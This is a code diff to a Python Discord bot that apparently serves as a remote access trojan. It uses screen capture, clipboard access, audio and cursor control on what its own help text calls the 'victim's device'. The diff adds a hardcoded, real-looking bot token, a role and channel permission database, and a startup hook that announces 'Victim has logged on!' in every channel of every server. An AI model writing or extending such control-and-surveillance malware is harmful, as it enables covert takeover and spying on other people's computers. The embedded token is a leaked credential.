@@ -1,6 +1,7 @@
 import discord
-from discord.ext import commands
+from discord.ext import commands, NoPrivateMessage
 from PIL import ImageGrab, ImageDraw
+from tinydb import TinyDB, Query
 import io
 import pyttsx3
 import pyaudio
@@ -21,16 +22,100 @@ import pyperclip
 import tempfile
 import sys
 
-TOKEN = "BOT-TOKEN-GOES-HERE"
+TOKEN = "MTIzNTY2NTc2Mzc2NDAxNTIyNQ.GZ7lV0.ia8P5W2DPt2N0jxJmxbG4UpHSBnwVjhLuj80ds"
 intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
+
+
+
+
+
+
+
+db = TinyDB('config.json')
+
+def in_dm(ctx):
+    return isinstance(ctx.channel, discord.DMChannel)
+
+def check_channel_or_dm():
+    async def predicate(ctx):
+        return not in_dm(ctx)
+    return commands.check(predicate)
+
+def in_force_allow_channel(ctx):
+    if isinstance(ctx.channel, discord.DMChannel):
+        return False
+    return ctx.channel.name == '$jf_forceallow'
+
+
+@bot.command()
+@check_channel_or_dm()
+async def config_role(ctx, action, role: discord.Role):
+    if in_force_allow_channel(ctx) or any(role.id in server['allowed_roles'] for server in db.search(Query().id == ctx.guild.id)):
+        if action == 'add':
+            db.upsert({'id': ctx.guild.id, 'allowed_roles': db.search(Query().id == ctx.guild.id)[0].get('allowed_roles', []) + [role.id]}, Query().id == ctx.guild.id)
+            await ctx.send(f'Added role {role.name} to allowed roles.')
+        elif action == 'remove':
+            db.update({'allowed_roles': [r for r in db.search(Query().id == ctx.guild.id)[0].get('allowed_roles', []) if r != role.id]}, Query().id == ctx.guild.id)
+            await ctx.send(f'Removed role {role.name} from allowed roles.')
+    else:
+        await ctx.send('You do not have permission to perform this action.')
+
+@bot.command()
+@check_channel_or_dm()
+async def config_channel(ctx, action, channel: discord.TextChannel):
+    if in_force_allow_channel(ctx) or any(channel.id in server['allowed_channels'] for server in db.search(Query().id == ctx.guild.id)):
+        if action == 'add':
+            db.upsert({'id': ctx.guild.id, 'allowed_channels': db.search(Query().id == ctx.guild.id)[0].get('allowed_channels', []) + [channel.id]}, Query().id == ctx.guild.id)
+            await ctx.send(f'Added channel {channel.name} to allowed channels.')
+        elif action == 'remove':
+            db.update({'allowed_channels': [c for c in db.search(Query().id == ctx.guild.id)[0].get('allowed_channels', []) if c != channel.id]}, Query().id == ctx.guild.id)
+            await ctx.send(f'Removed channel {channel.name} from allowed channels.')
+    else:
+        await ctx.send('You do not have permission to perform this action.')
+
+@bot.check
+def check_permissions(ctx):
+    if in_dm(ctx):
+        raise NoPrivateMessage('Commands cannot be run in DMs.')
+    if in_force_allow_channel(ctx):
+        return True
+    server = db.search(Query().id == ctx.guild.id)
+    if not server:
+        return False
+    allowed_roles = server[0].get('allowed_roles', [])
+    allowed_channels = server[0].get('allowed_channels', [])
+    if any(role.id in allowed_roles for role in ctx.author.roles) or ctx.channel.id in allowed_channels:
+        return True
+    return False
+
+@bot.event
+async def on_guild_join(guild):
+    db.upsert({'id': guild.id}, Query().id == guild.id)
+
+@bot.command()
+@commands.dm_only()
+async def no_dm(ctx):
+    await ctx.send('Commands cannot be run in DMs.')
+
+
+
+
+
+
+
+
+
 @bot.event
 async def on_ready():
     print(f'We have logged in as {bot.user.name}')
+    for guild in bot.guilds:
+        for channel in guild.text_channels:
+            await channel.send("Victim has logged on!")
     
 @bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
 async def setpos(ctx, x: int, y: int):
